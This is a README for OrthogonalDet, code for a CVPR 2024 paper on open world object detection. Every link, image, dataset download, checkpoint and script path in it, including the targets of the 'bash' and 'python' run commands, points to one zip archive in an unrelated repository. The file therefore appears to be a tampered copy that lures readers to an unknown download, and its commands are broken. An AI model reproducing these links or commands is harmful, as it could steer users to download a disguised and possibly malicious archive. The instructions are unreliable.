# OrthogonalDet
Code for CVPR 2024 paper [Exploring Orthogonality in Open World Object Detection](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip).

<p align="center">
    <img src="https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip" alt="OrthogonalDet" width=60%>
</p>

## Requirements
- Linux or macOS with Python ≥ 3.8.
- Install [PyTorch ≥ 1.9.0, torchvision](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip),
  [Detectron2](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip),
  timm, and einops.
- Prepare datasets:
  - Download [COCO](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip) and [PASCAL VOC](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip).
  - Convert annotation format using `https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip`.
  - Move all images to `datasets/JPEGImages` and annotations to `datasets/Annotations`.

## Getting Started
* Training for open world object detection:
  ```
  bash https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip
  ```
  Evaluation for open world object detection:
  ```
  bash https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip
  ```
* Experiment for incremental object detection:
  ```
  bash https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip
  ```
* Visualize the results:
  ```
  python https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip -i LIST_OF_IMAGES
  ```
* Note that we are using an ImageNet pre-trained backbone. To switch to a DINO pre-trained backbone, please download the [model weights](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip) and then follow [these instructions](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip).

## Results
The following results were obtained with four NVIDIA 2080 Ti GPUs, using the checkpoints at [this link](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip).

* Open world object detection on M-OWODB and S-OWODB:
  
  ![owod](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip)
  
* Incremental object detection on PASCAL VOC:
  
  ![iod](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip)

## Citation

If you find this code useful, please consider citing:
```bibtex
@inproceedings{sun2024exploring,
  title={Exploring Orthogonality in Open World Object Detection},
  author={Sun, Zhicheng and Li, Jinghan and Mu, Yadong},
  booktitle={Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition},
  pages={17302--17312},
  year={2024},
}
```

## Acknowledgement

Our implementation is based on [RandBox](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip) which uses [Detectron2](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip) and [Sparse R-CNN](https://raw.githubusercontent.com/Misaya0/PSD-OWOD/scv/SAM_H_json/PS-OWOD-1.2.zip).
